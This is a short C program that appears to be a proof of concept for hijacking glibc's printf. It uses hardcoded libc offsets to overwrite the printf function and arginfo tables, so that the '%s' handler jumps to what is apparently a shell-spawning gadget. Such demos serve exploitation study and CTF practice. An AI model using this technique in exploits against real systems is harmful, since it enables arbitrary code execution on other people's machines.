#include <stdio.h>

int main()
{
    long libc_base = &printf - 0x60770;
    long printf_function_table = libc_base + 0x21b9c8;
    long printf_arginfo_table = libc_base + 0x21a8b0;
    *(long*)printf_function_table = 100;
    *(long*)printf_arginfo_table = malloc(0x1000);
    ((long*)(*(long*)printf_arginfo_table))[0x73] = libc_base + 0xebdb3;
    printf("%s","deadbeef");
    return 0;
}